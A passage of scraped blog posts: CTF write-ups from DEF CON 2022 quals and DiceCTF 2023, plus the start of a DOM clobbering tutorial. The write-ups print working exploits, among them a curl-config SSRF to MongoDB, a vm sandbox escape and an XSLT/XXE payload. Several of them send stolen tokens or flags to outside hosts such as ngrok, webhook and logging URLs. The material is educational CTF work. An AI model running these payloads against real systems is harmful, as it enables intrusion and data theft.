Let the admin bot load your widget Get the admin token Call the API to get the flag Therefore, the next step is to see how to generate this widget, and continue to look for information in the source code. 18:26(46m) Continue studying the source codeI found a function called getChatWidget in the source code that is used to load the widget, but it took some time to study what it was doing. 18:35(55m) Confirm loading methodAt this point, I confirmed that it was a set of things called rfw, which stands for Remote Flutter Widgets. Although I had found this set of things on Google when I discovered that it was a remote loading component, and my teammates had also found it, I didn’t dare to confirm it before because I was afraid of going in the wrong direction. Later, we were able to confirm it because of this code: https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32 /// The first four bytes of a Remote Flutter Widgets binary library blob. /// /// This signature is automatically added by [encodeLibraryBlob] and is checked /// in [decodeLibraryBlob]. /// /// See also: /// /// * [dataBlobSignature], which is the signature for binary data blobs. const List&lt;int> libraryBlobSignature = &lt;int>[0xFE, 0x52, 0x46, 0x57]; These four bytes match the remote widget we saw earlier, so we confirmed that it was generated using this method. Next, I had to study how to write in Flutter and how to generate widgets. Just installing the Flutter SDK took some time. 19:03 (1h 23m) Decoding the widgetActually, there isn’t much documentation for RFW, so it was faster to just look at the examples. I found the code to encode&#x2F;decode widgets in the example, modified it, and was able to decode our /widget/chatmessage, which looked like this: widget root = Container(&#123; child: Column(&#123; children: [Row(&#123; children: [Text(&#123; text: From &#125;), Expanded(&#123; child: Text(&#123; text: data.author.user, style: &#123; color: 4278230474 &#125; &#125;) &#125;)] &#125;), Row(&#123; children: [Expanded(&#123; child: Text(&#123; text: data.data.message &#125;) &#125;)] &#125;)] &#125;) &#125;); Here’s the code I used to decode it: import 'dart:io'; import 'package:rfw/formats.dart'; void main () async &#123; final File currentFile = File('chatmessage'); print(decodeLibraryBlob(await currentFile.readAsBytes())); &#125; At this point, my focus was on “how to write a Flutter widget that can be XSSed.” I originally had three ideas: Write HTML directly, like in React. Write JS code directly, such as using eval() in the widget’s onload event. Use iframe src or srcdoc to XSS. At first, I thought it would be easy, but the more I researched, the more I realized it wasn’t that simple. I thought Flutter was like React&#x2F;Vue, but then I realized it had its own system and syntax, which was completely different. You can’t write HTML or JS, and although iframes can be used, they require importing another library, which would cause problems in this problem. However, since there were no other clues at the time, I continued to research this direction. 19:37 (1h 57m) Dinner breakI thought I would finish before dinner, but I was too naive. 20:12 (2h 32m) Back to work after dinner20:26 (2h 46m) Found the right directionAt this point, since the path of inserting HTML&#x2F;JS seemed to be a dead end, I wondered if I was going in the wrong direction and if this problem should rely on some existing mechanism. And just at this time, my teammate asked me to help decode the poll widget, and after seeing the content, I confirmed that this was the right direction: widget root = Container(&#123; child: Column(&#123; children: [Row(&#123; children: [Text(&#123; text: From &#125;), Text(&#123; text: data.author.user, style: &#123; color: 4278230474 &#125; &#125;)] &#125;), Padding(&#123; padding: [0.0, 5.0, 0.0, 0.0], child: Text(&#123; text: data.data.title &#125;) &#125;), switch state.loaded &#123; true: Column(&#123; children: [... for loop in data.poll_options: Row(&#123; children: [Padding(&#123; child: ElevatedButton(&#123; child: Text(&#123; text: loop0.text &#125;), onPressed: event api_post &#123; path: data.data.apiVote, body: &#123; selection: loop0.text &#125; &#125; &#125;), padding: [0.0, 5.0, 10.0, 0.0] &#125;), Text(&#123; text: loop0.count &#125;)] &#125;), TextButton(&#123; child: Text(&#123; text: Refresh, style: &#123; color: 4294942366 &#125; &#125;), onPressed: set state.loaded = false &#125;) ] &#125;), null: ApiMapper(&#123; url: data.data.apiGet, jsonKey: options, dataKey: poll_options, onLoaded: set state.loaded = true &#125;) &#125; ] &#125;) &#125;); The ApiMapper at the bottom looks like it can send an API, although I don’t know what can be done with it yet, but it’s worth a try. Then I tried to see if I could rebuild the same widget locally, but no matter how I ran it, there were errors, which took a lot of time. 21:11 (3h 31m) Found the right way to buildAfter various attempts, I found that there was a local word in the remote file, but it didn’t appear when I tried to reproduce it locally. So I guessed that there might be an import local in front, and it turned out to be true. At this point, I finally figured out how to build a widget that could use ApiMapper. import core.widgets; import core.material; import local; widget root = Container( child: Column( children: [ Row( children: [ Text( text: 'pewpew' ), Expanded( child: Text( text: data.author.user, style: &#123; color: 4278230474 &#125; ) ) ] ), Row( children: [ ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"a\", onLoaded: set state.abc = 'abc' ) ] ) ] ) ); But after this step, I got stuck again because ApiMapper can only send GET requests, not POST, which can be proven from the source code: 21:30 (3h 50m) Another team solved itI wanted to get the first blood, but I was outmatched and had to QQ. At this point, I was still studying the source code, both for the problem and for RFW, to see if I could find more clues. 21:43 (4h 03m) Found other key pointsBoth my teammate and I noticed that there was an event api_post in the poll widget that could be used to send POST requests, but we weren’t sure how to trigger it. 22:22 (4h 42m) Successfully triggered the eventMy teammate found a way to trigger it: Row( children: [ ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"a\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/test\", body: \"bodytest\" &#125; ) ] ) I actually tried the same method myself, but for some reason it didn’t work. Although we could send POST requests, we couldn’t get a response, so it didn’t seem to be useful. I got stuck here for a while. I felt like we must have missed some important details, otherwise we wouldn’t have been stuck here for so long. So I went back and played the app again to see if there was anything we missed. 22:56(5h 16m) Back on track, starting to implement exploitAfter playing through again, I found that there was a GET API /api/token that could retrieve token data, and the data retrieved by ApiMapper would be stored in data. Therefore, we can first use ApiMapper to retrieve the data, and then use event &quot;api_post&quot; to send the retrieved data to obtain the admin token. The concept is not difficult, but the implementation is difficult. I spent some time sharing this idea with my teammates, thinking that it would be faster if we wrote it together. During the process of trying, I found that if the onloaded of ApiMapper is directly connected to event &quot;api_post&quot;, it seems that the data cannot be obtained, so I need to find another way. At this time, I thought of the switch that appeared in the poll, and I should be able to use that trick. By the way, the way I learned rfw was to directly look at the code. In fact, the comments and tests were written in detail, and there was much more information than the documentation: https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479 23:19(5h 39m) Failed exploitI wrote a widget that I thought would succeed no matter how I looked at it: widget root &#123; loaded: 1 &#125; = Container( child: Column( children: [ Row( children: [ Text( text: \"test\" ), switch state.loaded &#123; 2: ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"b\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/send\", body: &#123; \"token\": data.new_token &#125; &#125;, ), 1: ApiMapper( url: \"/api/token\", jsonKey: \"new_token\", dataKey: \"new_token\", onLoaded: set state.loaded = 2, ), default: Text( text: 'yo' ) &#125; ] ) ] ) ); But for some reason, it failed. The second request could not be sent out, so I had to continue trying other methods. 23:25(5h 45m) Solved 🎉Finally, I used this: import core.widgets; import core.material; import local; widget root &#123; loaded: 1 &#125; = Container( child: Column( children: [ Row( children: [ Text( text: \"test\" ), ApiMapper( url: \"@example.ngrok.io/json\", jsonKey: \"a\", dataKey: \"b\", onLoaded: event \"api_post\" &#123; path: \"@example.ngrok.io/send\", body: &#123; \"token\": data.new_token &#125; &#125;, ), switch state.loaded &#123; 1: ApiMapper( url: \"/api/token\", jsonKey: \"new_token\", dataKey: \"new_token\", onLoaded: set state.loaded = 2, ), default: Text( text: 'yo' ) &#125; ] ) ] ) ); That switch has no function, and it doesn’t matter if it is removed. It’s just because I was too lazy to delete it before. In short, the concept is that we can use two ApiMappers at the same time. The first one is sent to our server and waits for 3 seconds. In this way, when onLoaded is triggered, the response that retrieves the token has already returned, so data.new_token is the token, and it will be sent to our server. SummaryFinally, summarize the solution to this problem: Observe the App and find out that custom widgets can be loaded Learn how to generate a valid widget Observe the existing remote widgets and find out that there are ApiMapper and api_post Observe the App and find out that /api/token can retrieve the token and get the response Write a widget that can first use ApiMapper to retrieve the token and then use api_post to send it out This is what I said at the beginning. The difficulty of this problem is not high, and it tests basic skills. What I mean by basic skills is: Observation: You must be able to observe that this problem uses rfw and how the existing mechanisms work, including /api/token, /api/flag, and the logic of various existing widgets. Ability to learn new things: You must be able to quickly learn the basic syntax of dart in rfw. Ability to write code: You must be able to make a working widget and use existing mechanisms to make it work. The concept of this problem is not difficult, and the time spent is due to being unfamiliar with flutter&#x2F;dart&#x2F;rfw, so there are always syntax errors or situations where it just doesn’t work. As for self-reflection, I probably looked in the wrong direction at the beginning and should have observed for a while longer. For example, if you decode the poll widget at the beginning and observe it carefully, you may be able to save a lot of time. By the way, after following the team to play the qualification round, my biggest realization is that if you want to truly enjoy DEF CON CTF, you still need basic knowledge of binary-related knowledge. I don’t think it needs to be very strong, but at least basic knowledge (such as being able to solve very simple pwn and reverse problems in other CTFs?), so that you can know what your teammates are doing and have a sense of participation. If you don’t know anything like me, I think it’s a bit of a pity. This feels like, at least you have to play a little bit of LOL, and then you will know what’s going on when you watch the game, and you will know which side is good-looking. If you haven’t played it, you basically can’t understand it, and you won’t react even if you see a player using a powerful ultimate.","link":"/2022/06/03/en/defcon-2022-qual-writeup/"},{"title":"DiceCTF 2023 Notes","text":"Although it’s been almost two months, I’m still going to take some notes. Last year, I was electrocuted badly. I thought it would be better this year since it’s been a year, but I still got electrocuted. Keywords: SSRF mongoDB via telnet protocol jetty cookie parser ASI (Automatic Semicolon Insertion) VM sandbox escape via Proxy process.binding Browser’s XSLT + XXE First, let me post the official repo, which contains the code and answers: https://github.com/dicegang/dicectf-2023-challenges Web - codebox (30 solves)This is the only question that was solved, and it’s quite interesting. The backend is very simple, with a function that adjusts the CSP based on the code parameter, which can achieve CSP injection: const fastify = require('fastify')(); const HTMLParser = require('node-html-parser'); const box = require('fs').readFileSync('box.html', 'utf-8'); fastify.get('/', (req, res) => &#123; const code = req.query.code; const images = []; if (code) &#123; const parsed = HTMLParser.parse(code); for (let img of parsed.getElementsByTagName('img')) &#123; let src = img.getAttribute('src'); if (src) &#123; images.push(src); &#125; &#125; &#125; const csp = [ \"default-src 'none'\", \"style-src 'unsafe-inline'\", \"script-src 'unsafe-inline'\", ]; if (images.length) &#123; csp.push(`img-src $&#123;images.join(' ')&#125;`); &#125; res.header('Content-Security-Policy', csp.join('; ')); res.type('text/html'); return res.send(box); &#125;); fastify.listen(&#123; host: '0.0.0.0', port: 8080 &#125;); The frontend looks like this, which puts the code you provide into a sandbox iframe: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;title>codebox&lt;/title> &lt;meta charset=\"UTF-8\" /> &lt;meta name=\"viewport\" content=\"width=device-width,initial-scale=1\" /> &lt;style> * &#123; margin: 0; font-family: monospace; line-height: 1.5em; &#125; div &#123; margin: auto; width: 80%; padding: 20px; &#125; textarea &#123; width: 100%; height: 200px; max-width: 500px; &#125; iframe &#123; border: 1px solid lightgray; &#125; &lt;/style> &lt;/head> &lt;body> &lt;div id=\"content\"> &lt;h1>codebox&lt;/h1> &lt;p>Codebox lets you test your own HTML in a sandbox!&lt;/p> &lt;br> &lt;form action=\"/\" method=\"GET\"> &lt;textarea name=\"code\" id=\"code\">&lt;/textarea> &lt;br>&lt;br> &lt;button>Create&lt;/button> &lt;/form> &lt;br> &lt;br> &lt;/div> &lt;div id=\"flag\">&lt;/div> &lt;/body> &lt;script> const code = new URL(window.location.href).searchParams.get('code'); if (code) &#123; const frame = document.createElement('iframe'); frame.srcdoc = code; frame.sandbox = ''; frame.width = '100%'; document.getElementById('content').appendChild(frame); document.getElementById('code').value = code; &#125; const flag = localStorage.getItem('flag') ?? \"flag&#123;test_flag&#125;\"; document.getElementById('flag').innerHTML = `&lt;h1>$&#123;flag&#125;&lt;/h1>`; &lt;/script> &lt;/html> The interesting thing about this question is that at first, you might think it allows you to change the CSP, and you can use the sandbox CSP rule to do something, and then you can escape the sandbox, but you will find that it doesn’t work. The correct answer is to use require-trusted-types-for &#39;script&#39;; to block document.getElementById(&#39;flag&#39;).innerHTML = flag;, and then use report-uri https://vps to report the blocked content, which allows you to get the flag. There’s also another small detail, which is that frame.sandbox = &#39;&#39;; is also managed by require-trusted-types-for, so this part will fail first, so you need to skip this part as well. The skipping method is simple. If you have multiple parameters, the frontend’s searchParams.get() will only take the first parameter, while the backend will turn it into an array if there are multiple parameters. Therefore, passing ?code=&amp;code=payload will make the content seen by the frontend and backend different, and the frontend will think it’s empty and skip that part. Web - unfinished (14 solves)The core code of this question is as follows: app.post(\"/api/ping\", requiresLogin, (req, res) => &#123; let &#123; url &#125; = req.body; if (!url || typeof url !== \"string\") &#123; return res.json(&#123; success: false, message: \"Invalid URL\" &#125;); &#125; try &#123; let parsed = new URL(url); if (![\"http:\", \"https:\"].includes(parsed.protocol)) throw new Error(\"Invalid URL\"); &#125; catch (e) &#123; return res.json(&#123; success: false, message: e.message &#125;); &#125; const args = [ url ]; let &#123; opt, data &#125; = req.body; if (opt &amp;&amp; data &amp;&amp; typeof opt === \"string\" &amp;&amp; typeof data === \"string\") &#123; if (!/^-[A-Za-z]$/.test(opt)) &#123; return res.json(&#123; success: false, message: \"Invalid option\" &#125;); &#125; // if -d option or if GET / POST switch if (opt === \"-d\" || [\"GET\", \"POST\"].includes(data)) &#123; args.push(opt, data); &#125; &#125; cp.spawn('curl', args, &#123; timeout: 2000, cwd: \"/tmp\" &#125;).on('close', (code) => &#123; // TODO: save result to database res.json(&#123; success: true, message: `The site is $&#123;code === 0 ? 'up' : 'down'&#125;` &#125;); &#125;); &#125;); You can pass in a URL and options to execute cURL, and the parameter check can be bypassed using config. First, download the config with -o and save it to a file named GET, and then use -K to use the config, like this: import requests import time host = 'https://unfinished-27df3c439f8d6dd1.mc.ax' hook_url = 'https://webhook.site/576f330a-c867-4609-b83f-36bbca32abfe' config_url = 'https://gist.githubusercontent.com/aszx87410/a0a710f8bcc351958d107924632888c9/raw/54673c647da2ea04e90a1c67c7a40eb7e99320f6/test.txt' def send_command(url, opt=\"\", data=\"\"): if opt == \"\": req_data = &#123; \"url\": url &#125; else: req_data = &#123; \"url\": url, \"opt\": opt, \"data\": data &#125; resp = requests.post(host + \"/api/ping\", data=req_data) print(resp.status_code) send_command(hook_url) time.sleep(5) # need to wait for server restart send_command(config_url, \"-o\", \"GET\") time.sleep(5) send_command(hook_url, \"-K\", \"GET\") time.sleep(5) But this is the easiest part. The hardest part is that the flag is stored in mongoDB, so you need to find a way to SSRF mongoDB using cURL. Oh, by the way, you can’t use gopher because it’s disabled. During the competition, I didn’t know how to do it and couldn’t solve it. After the competition, I looked at other people’s solutions and found that you can use telnet to do it (source: https://discord.com/channels/805956008665022475/805962699246534677/1071901986338897982): import requests import time url = 'https://unfinished-9044.mc.ax' with open('raw_packet.txt', 'wb') as fout: fout.write(b'\\x92\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xdd\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7d\\x00\\x00\\x00\\x02\\x66\\x69\\x6e\\x64\\x00\\x05\\x00\\x00\\x00\\x66\\x6c\\x61\\x67\\x00\\x03\\x66\\x69\\x6c\\x74\\x65\\x72\\x00\\x05\\x00\\x00\\x00\\x00\\x10\\x6c\\x69\\x6d\\x69\\x74\\x00\\x01\\x00\\x00\\x00\\x08\\x73\\x69\\x6e\\x67\\x6c\\x65\\x42\\x61\\x74\\x63\\x68\\x00\\x01\\x10\\x62\\x61\\x74\\x63\\x68\\x53\\x69\\x7a\\x65\\x00\\x01\\x00\\x00\\x00\\x03\\x6c\\x73\\x69\\x64\\x00\\x1e\\x00\\x00\\x00\\x05\\x69\\x64\\x00\\x10\\x00\\x00\\x00\\x04\\xce\\x2d\\x77\\x58\\x58\\xfd\\x41\\xc2\\x98\\xf9') print('upload packet contents') res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/raw_packet.txt', 'opt': '-o', 'data': 'GET', &#125;) assert res.status_code == 200 time.sleep(5) print('upload curl config') with open('curl.config', 'wb') as fout: fout.write((\"\"\" next url=\"telnet://mongodb:27017\" upload-file=\"GET\" output=\"flag.txt\" no-buffer \"\"\").strip().encode()) res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/curl.config', 'opt': '-o', 'data': 'POST', &#125;) assert res.status_code == 200 time.sleep(5) print('download flag') try: res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://google.com/', 'opt': '-K', 'data': 'POST', &#125;) assert res.status_code == 200 except: pass time.sleep(10) print('upload exfil config') with open('curl.config', 'wb') as fout: fout.write((\"\"\" next url=\"telnet://[...]:1337\" upload-file=\"flag.txt\" \"\"\").strip().encode()) res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://[...]/curl.config', 'opt': '-o', 'data': 'POST', &#125;) assert res.status_code == 200 time.sleep(5) print('exfil') try: res = requests.post('%s/api/ping' % url, data = &#123; 'url': 'http://google.com/', 'opt': '-K', 'data': 'POST', &#125;) assert res.status_code == 200 except: pass There’s also an unexpected solution, which is to download a file with cURL and overwrite the contents in node_modules. This way, when the server restarts, it will load the JS you wrote, and you can easily get the flag. Web - jnotes (6 solves)This question is a Java web: package dev.arxenix; import java.net.URLDecoder; import java.net.URLEncoder; import java.nio.charset.StandardCharsets; import io.javalin.Javalin; import io.javalin.http.Context; import io.javalin.http.Cookie; public class App &#123; public static String DEFAULT_NOTE = \"Hello world!\\r\\nThis is a simple note-taking app.\"; public static String getNote(Context ctx) &#123; var note = ctx.cookie(\"note\"); if (note == null) &#123; setNote(ctx, DEFAULT_NOTE); return DEFAULT_NOTE; &#125; return URLDecoder.decode(note, StandardCharsets.UTF_8); &#125; public static void setNote(Context ctx, String note) &#123; note = URLEncoder.encode(note, StandardCharsets.UTF_8); ctx.cookie(new Cookie(\"note\", note, \"/\", -1, false, 0, true)); &#125; public static void main(String[] args) &#123; var app = Javalin.create(); app.get(\"/\", ctx -> &#123; var note = getNote(ctx); ctx.html(\"\"\" &lt;html> &lt;head>&lt;/head> &lt;body> &lt;h1>jnotes&lt;/h1> &lt;form method=\"post\" action=\"create\"> &lt;textarea rows=\"20\" cols=\"50\" name=\"note\"> %s &lt;/textarea> &lt;br> &lt;button type=\"submit\">Save notes&lt;/button> &lt;/form> &lt;hr style=\"margin-top: 10em\"> &lt;footer> &lt;i>see something unusual on our site? report it &lt;a href=\"https://adminbot.mc.ax/web-jnotes\">here&lt;/a>&lt;/i> &lt;/footer> &lt;/body> &lt;/html>\"\"\".formatted(note)); &#125;); app.post(\"/create\", ctx -> &#123; var note = ctx.formParam(\"note\"); setNote(ctx, note); ctx.redirect(\"/\"); &#125;); app.start(1337); &#125; &#125; Although you have a free XSS, the cookie is httponly, so you can’t read it. The solution is to use jetty’s strange cookie parsing behavior. If the content of the cookie contains &quot;, it will read until the next &quot;. For example, if there are three cookies: note&#x3D;”a flag&#x3D;dice{flag} end&#x3D;b” The header sent is: note=&quot;a; flag=dice&#123;flag&#125;; end=b&quot;, which will be parsed as a single note cookie instead of the expected three cookies. So the key is to create these cookies and then make the browser send them in the order we want. Chrome sends cookies in the order of longest path first, followed by most recently updated, so all we need to do is: document.cookie = `note=\"a; path=//`; // use double slash path to get it to appear at start (longest path) document.cookie = `end=ok;\"`; // last cookie (most recently updated) w = window.open('https://jnotes.mc.ax//') to make the flag reflect on the page and obtain the flag. Web - gift (4 solves)I didn’t look at this question carefully, and I still haven’t studied it after the competition. I only know that there is a part related to ASI (Automatic Semicolon Insertion), where it looks like A, but the actual result is B, due to the mechanism of JS inserting semicolons. There have been similar questions before, which are quite interesting, but it is indeed difficult to see with the naked eye. It seems that I need to practice more. Web - jwtjail (3 solves)I really regret this question. I have looked for everything I should have looked for, and I have also looked at the original code of the lib several times, but I still couldn’t solve it, and I was so close. The code looks like this: const jwt = require(\"jsonwebtoken\"); const express = require(\"express\"); const vm = require(\"vm\"); const app = express(); const PORT = process.env.PORT || 12345; app.use(express.urlencoded(&#123; extended: false &#125;)); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`).runInContext(vm.createContext(Object.create(null), ctx), &#123; timeout: 250 &#125;); process.mainModule = null; // 🙃 app.use(express.static(\"public\")); app.post(\"/api/verify\", (req, res) => &#123; let &#123; token, secretOrPrivateKey &#125; = req.body; try &#123; token = unserialize(token); secretOrPrivateKey = unserialize(secretOrPrivateKey); res.json(&#123; success: true, data: jwt.verify(token, secretOrPrivateKey) &#125;); &#125; catch &#123; res.json(&#123; success: false, data: \"Verification failed\" &#125;); &#125; &#125;); app.listen(PORT, () => console.log(`web/jwtjail listening on port $&#123;PORT&#125;`)); By using vm to put the data you throw into another context, and then calling the jwt lib, the goal is to find a place where you can escape during the processing of the jwt lib. The solution is that we can add a proxy to a function. If the function is called, it will first call the apply of the proxy. var p = new Proxy(_ => _, &#123; apply(target, thisArg, argumentsList) &#123; console.log('apply') &#125; &#125;) p() // apply And the third parameter argumentsList of this apply comes from an object from the outside world, so we can escape from the VM by relying on this parameter. In addition, although process.mainModule has been deleted, you can use process.binding(&quot;spawn_sync&quot;) to execute the code. A simple PoC looks like this: \"use strict\"; const vm = require(\"vm\"); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`) .runInContext( vm.createContext(Object.create(&#123;console&#125;), ctx), &#123; timeout: 250 &#125; ); var data = `&#123; key: &#123; toString: new Proxy(_ => _, &#123; apply(a, b, c) &#123; console.log(c.constructor.constructor(\"return this\")().process.pid) &#125; &#125;) &#125; &#125;` try &#123; data = unserialize(data); console.log(data['key'].toString()) &#125; catch(err) &#123; console.log(err) &#125; In the Discord discussion after the competition, someone also mentioned that it is possible to use double proxies to achieve “escape as long as you access the value of the object”, like this: \"use strict\"; const vm = require(\"vm\"); const ctx = &#123; codeGeneration: &#123; strings: false, wasm: false &#125;&#125;; const unserialize = (data) => new vm.Script(`\"use strict\"; ($&#123;data&#125;)`) .runInContext( vm.createContext(Object.create(&#123;console&#125;), ctx), &#123; timeout: 250 &#125; ); var data = `new Proxy(&#123;&#125;, &#123; get: new Proxy(_=>_, &#123; apply(a,b,c) &#123; console.log(c.constructor.constructor(\"return this\")().process.pid) &#125; &#125;) &#125;)` try &#123; data = unserialize(data); data['key']; &#125; catch(err) &#123; console.log(err) &#125; Author’s writeup: https://brycec.me/posts/dicectf_2023_challenges Web - impossible XSS (0 solves)This question is very cool, and the code is very simple: const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/', (req, res) => &#123; // free xss, how hard could it be? res.end(req.query?.xss ?? 'welcome to impossible-xss'); &#125;); app.get('/flag', (req, res) => &#123; // flag in admin bot's FLAG cookie res.end(req.cookies?.FLAG ?? 'dice&#123;fakeflag&#125;'); &#125;); app.listen(8080); You have a free xss, but there is a line await page.setJavaScriptEnabled(false); in the admin bot, which turns off JS directly. The solution is to use XSLT with XXE, like this: ss = `&lt;?xml version=\"1.0\"?> &lt;!DOCTYPE a [ &lt;!ENTITY xxe SYSTEM \"https://impossible-xss.mc.ax/flag\" >]> &lt;xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\"> &lt;xsl:template match=\"/asdf\"> &lt;HTML> &lt;HEAD> &lt;TITLE>&lt;/TITLE> &lt;/HEAD> &lt;BODY> &lt;img> &lt;xsl:attribute name=\"src\"> https://hc.lc/log2.php?&amp;xxe; &lt;/xsl:attribute> &lt;/img> &lt;/BODY> &lt;/HTML> &lt;/xsl:template> &lt;/xsl:stylesheet>` xml=`&lt;?xml version=\"1.0\"?> &lt;?xml-stylesheet type=\"text/xsl\" href=\"data:text/plain;base64,$&#123;btoa(ss)&#125;\"?> &lt;asdf>&lt;/asdf>` payload=encodeURIComponent(xml) Author’s writeup: https://blog.ankursundara.com/dicectf23-writeups/","link":"/2023/03/26/en/dicectf-2023-writeup/"},{"title":"An Introduction to DOM Clobbering and Its Applications","text":"IntroductionAs a front-end engineer, it is natural to know a lot about front-end-related knowledge, such as HTML or JS-related things, but those knowledge is usually related to “use”. For example, I know that when writing HTML, I should be semantic and use the correct tags; I know how to use JS. However, some knowledge related to web pages, although related to web pages, is not something that front-end engineers usually come into contact with. What I mean by “some knowledge” actually refers to “knowledge related to information security”. Some concepts commonly found in information security, although related to web pages, are things that we are not familiar with, and I think understanding these is actually very important. Because you must know how to attack in order to defend, you must first understand the attack methods and principles before you know how to defend against these attacks. Before we start, let’s have a fun little question for everyone to try. Suppose you have a piece of code with a button and a script, as shown below: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;button id=\"btn\">click me&lt;/button> &lt;script> // TODO: add click event listener to button &lt;/script> &lt;/body> &lt;/html> Now please try to implement the function “click the button to pop up alert(1)” with the “shortest code”. For example, writing like this can achieve the goal: document.getElementById('btn') .addEventListener('click', () => &#123; alert(1) &#125;) So what is your answer if you want to make the code the shortest? Before you continue reading, think about this question first, and then let’s get started! Warning............. Quantum Entanglement of DOM and windowDo you know that things in the DOM can affect the window? This behavior is something I accidentally learned a few years ago in a front-end community on Facebook, that is, after you set an element with an id in HTML, you can directly access it in JS: &lt;button id=\"btn\">click me&lt;/button> &lt;script> console.log(window.btn) // &lt;button id=\"btn\">click me&lt;/button> &lt;/script> Then, because of the scope of JS, you can even use btn directly, because if the current scope cannot find it, it will look up all the way to the window. So the answer to the previous question is: btn.onclick = () => alert(1) You don’t need getElementById or querySelector, just use a variable with the same name as the id to get it. There should be no shorter code than this (if there is, please leave a comment to refute me). And this behavior is clearly defined in the spec, in 7.3.3 Named access on the Window object: Here are two key points: the value of the name content attribute for all embed, form, img, and object elements that have a non-empty name content attribute the value of the id content attribute for all HTML elements that have a non-empty id content attribute In other words, in addition to id, these four tags embed, form, img, and object can also be accessed using name: &lt;embed name=\"a\">&lt;/embed> &lt;form name=\"b\">&lt;/form> &lt;img name=\"c\" /> &lt;object name=\"d\">&lt;/object> But what is the use of knowing this? After understanding this specification, we can draw a conclusion: We have the opportunity to affect JS through HTML elements And this technique is used in attacks, which is the DOM Clobbering mentioned in the title. I first heard the word “clobbering” because of this attack, and when I looked it up, I found that it means “overwriting” in the CS field, which is a means of attacking by using DOM to overwrite some things. An Introduction to DOM ClobberingUnder what circumstances can you use DOM Clobbering to attack? First of all, you must have the opportunity to display your custom HTML on the page, otherwise it will not be possible. So a scene that can be attacked may look like this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;h1>留言板&lt;/h1> &lt;div> 你的留言：哈囉大家好 &lt;/div> &lt;script> if (window.TEST_MODE) &#123; // load test script var script = document.createElement('script') script.src = window.TEST_SCRIPT_SRC document.body.appendChild(script) &#125; &lt;/script> &lt;/body> &lt;/html> Assuming there is a message board, you can enter any content, but your input will be processed on the server side through DOMPurify, which removes anything that can execute JavaScript. Therefore, &lt;script&gt;&lt;/script&gt; will be deleted, &lt;img src=x onerror=alert(1)&gt;‘s onerror will be removed, and many XSS payloads will not pass. In short, you cannot execute JavaScript to achieve XSS because these are filtered out. However, for various reasons, HTML tags are not filtered out, so what you can do is display custom HTML. As long as you don’t execute JS, you can insert any HTML tags and set any attributes you want. So, you can do this: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> &lt;/head> &lt;body> &lt;h1>留言板&lt;/h1> &lt;div> 你的留言：&lt;div id=\"TEST_MODE\">&lt;/div> &lt;a id=\"TEST_SCRIPT_SRC\" href=\"my_evil_script\">&lt;/a> &lt;/div> &lt;script> if (window.TEST_MODE) &#123; // load test script var script = document.createElement('script') script.src = window.TEST_SCRIPT_SRC document.body.appendChild(script) &#125; &lt;/script> &lt;/body> &lt;/html> According to the knowledge we obtained above, we can insert an id tag &lt;div id=&quot;TEST_MODE&quot;&gt;&lt;/div&gt;, so that the if (window.TEST_MODE) in the JS below will pass, because window.TEST_MODE will be this div element. Next, we can use &lt;a id=&quot;TEST_SCRIPT_SRC&quot; href=&quot;my_evil_script&quot;&gt;&lt;/a&gt; to make window.TEST_SCRIPT_SRC become the string we want after conversion. In most cases, just overwriting a variable with an HTML element is not enough. For example, if you convert window.TEST_MODE in the above code to a string and print it out: // &lt;div id=\"TEST_MODE\" /> console.log(window.TEST_MODE + '') The result will be: [object HTMLDivElement]. Converting an HTML element to a string is like this, it will become this form, and if it is like this, it is basically impossible to use. But fortunately, there are two elements in HTML that will be specially processed when toString: &lt;base&gt; and &lt;a&gt;: Source: 4.6.3 API for a and area elements These two elements will return URLs when toString, and we can use the href attribute to set the URL, so that the content after toString can be controlled. So, combining the above techniques, we learned: Use HTML with id attributes to affect JS variables Use a with href and id to make the element toString become the value we want Through the above two techniques, combined with suitable scenarios, there is a chance to use DOM Clobbering for attacks. However, here is a reminder that if the variable you want to attack already exists, you cannot overwrite it with DOM, for example: &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;script> TEST_MODE = 1 &lt;/script> &lt;/head> &lt;body> &lt;div id=\"TEST_MODE\">&lt;/div> &lt;script> console.log(window.TEST_MODE) // 1 &lt;/script> &lt;/body> &lt;/html> Multi-level DOM ClobberingIn the previous example, we used DOM to overwrite window.TEST_MODE and create unexpected behavior. What if the object to be overwritten is an object? Is there a chance to use DOM clobbering to overwrite window.config.isTest? There are several ways to overwrite it. The first is to use the hierarchical relationship of HTML tags, which has this feature, the form, the form element: In the HTML spec, there is such a paragraph: You can use form[name] or form[id] to get its underlying elements, for example: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\"> &lt;input name=\"isTest\" /> &lt;button id=\"isProd\">&lt;/button> &lt;/form> &lt;script> console.log(config) 